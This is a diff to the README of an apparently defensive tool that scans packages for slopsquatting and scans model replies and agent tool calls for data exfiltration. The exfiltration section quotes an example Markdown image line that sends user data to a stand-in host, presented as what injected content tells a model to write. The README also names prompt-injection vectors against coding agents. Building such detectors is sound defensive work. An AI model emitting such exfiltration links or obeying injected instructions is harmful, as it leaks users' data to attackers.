@@ -16,6 +16,8 @@
 - **Checks your MCP servers:** `ingress mcpscan` finds poisoned tool descriptions, tools that give orders about other tools, look-alike tool names, and tools that changed after you pinned them.
 - **Checks your own APIs:** `ingress apiscan` looks for exposed files, open CORS, missing auth, leaked keys and responses an agent would obey, using only safe read requests.
 - **Gates repos for coding agents:** `ingress reposcan` and a GitHub Action flag Trojan Source Unicode, instructions hidden in markdown, poisoned AGENTS.md files and install scripts that download and run code.
+- **Checks packages before install:** `ingress pkgcheck` catches made-up package names, lookalikes of popular ones and brand-new packages with install scripts.
+- **Stops data leaving in links and images:** `ingress outcheck` and the action broker catch data hidden in image URLs, links and subdomains.
 - **Runs on your machine:** MCP server, CLI and library, or HTTP service. No telemetry ([PRIVACY.md](PRIVACY.md)).
 
 ```bash
@@ -301,6 +303,35 @@ Human report, `--json` or `--sarif`; exit code 1 on any high finding. A composit
 [`integrations/github-action`](integrations/github-action/action.yml). [docs/REPOSCAN.md](docs/REPOSCAN.md) has
 the full list of checks, a copy-paste workflow and a pre-commit hook. The action needs a release of
 `@acepaste/ingress` that includes `reposcan` on npm.
+
+### Package check: is this package real, and is it what it says?
+
+AI coding agents sometimes suggest packages that do not exist, and attackers register those names with malware in them ("slopsquatting"). `ingress pkgcheck` looks a package up on the public registry before you install it:
+
+```sh
+ingress pkgcheck npm left-padd express@4.21.2
+ingress pkgcheck pypi reqeusts numpy==2.1.0 --json
+ingress pkgcheck --command "pip install -U flask reqeusts"     # the packages an install line would fetch
+ingress pkgcheck npm expresss --offline                       # name check only, no network
+```
+
+It flags a package that is not on the registry (or a version that does not exist) as **high**, a name one or two edits away from a popular package (a built-in list of about 400 npm and 330 PyPI names, never downloaded), a package first published less than 30 days ago, npm install scripts (`preinstall`, `install`, `postinstall`; high when the package is also brand new), a PyPI release with no wheel (installing runs its build code), no linked source repository, deprecated or yanked releases, and a README the Ingress engine rates as aimed at an AI agent. Human report or `--json`; exit code 1 on any high finding. It reads only `registry.npmjs.org` and `pypi.org` (one GET per package, with the gate's own user agent) and installs nothing. In code: `pkgcheck(specs, { fetch })`.
+
+As a Claude Code hook it reads `npm install`, `npm i`, `pnpm add`, `yarn add`, `bun add`, `pip install`, `python -m pip install`, `uv add` and `uv pip install` lines before they run: a package that does not exist is refused, any other high finding is put to you, and everything else stays quiet. See [integrations/claude-code](integrations/claude-code/README.md#package-check-before-install-optional).
+
+### Exfiltration guard: data leaving inside an address
+
+The quietest leak needs no tool: content the model read tells it to write `![](https://collect.example/p.png?d=<your data>)`, and the chat window that renders the reply fetches the picture. `ingress outcheck` reads a model's reply for that before it is shown:
+
+```sh
+ingress outcheck < reply.md                     # report; exit code 1 when hostile
+ingress outcheck --safe < reply.md              # the reply with hostile addresses taken out
+ingress outcheck --session "$SESSION_ID" --json # judged with what that agent session fetched and read
+```
+
+It reads Markdown images and links, reference links, HTML (`src`, `srcset`, `href`, inline `style`), CSS `url()` and bare URLs, and looks in each address for long base64 or hex runs, credentials (after URL, base64 and hex decoding), the session's marker or a verification code, text from earlier tool results (recognised by fingerprints of five-word runs, never stored as text), and data-shaped subdomain labels (a DNS lookup alone delivers those). Anything a renderer fetches by itself (an image, an iframe, CSS) that carries data to a host the session never fetched from is **hostile**; the same in a link you would have to click is suspect. In code: `outcheck(text, options)`.
+
+The same checks run in the action broker on every tool call once a session has read outside content: a URL carrying earlier tool-result text, a DNS lookup carrying data, and a call that sends data (a file, a credential, encoded data, earlier tool-result text) to a host the session never fetched from and you never named all go to a person. In Claude Code that is the existing `PreToolUse` egress gate; nothing new to install.
 
 ## As the metered HTTP service
 
